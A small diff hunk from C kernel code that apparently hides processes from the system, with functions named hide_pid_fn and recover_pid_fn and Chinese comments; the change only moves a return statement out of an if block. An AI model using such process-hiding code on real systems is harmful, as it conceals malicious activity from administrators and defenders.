@@ -25,8 +25,8 @@ int hide_pid_fn(pid_t pid_victim){
 		hide_n->task_use_t=task_use;//设置task
 		list_add(&hide_n->hide_list_header_t,&hide_list_header);//把hide_node结点增加到hide_list_header上		
 		printk("Add hide_node %d to list success!\n",pid_victim);
-		return 0;
     }
+	return 0;
 }
 
 int recover_pid_fn(pid_t pid_victim){
